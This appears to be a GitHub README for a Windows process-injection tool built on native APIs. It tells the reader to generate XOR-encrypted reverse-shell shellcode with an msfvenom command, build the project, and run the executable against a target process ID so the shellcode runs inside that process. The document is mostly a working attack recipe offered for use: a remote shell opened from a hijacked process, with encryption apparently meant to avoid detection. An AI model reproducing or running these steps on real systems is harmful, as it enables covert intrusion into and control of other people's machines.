# Process Injection using Native APIs

## Usage 
1. Generate and replace the shellCode:
```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=4444 --arc x64 --platform windows EXITFUNC=thread --encrypt xor --encrypt-key z -f c
```
2. Build the project (x64)
3. Execute
```
.\NativeAPIs.exe <PID>
```
![image](https://github.com/NotokDay/NTProcessInjector/assets/115024808/77c97a98-7cf5-40fa-9df0-1eadb3521502)
![image](https://github.com/NotokDay/NTProcessInjector/assets/115024808/110de900-50ae-45ca-b595-69a3dd082e4a)
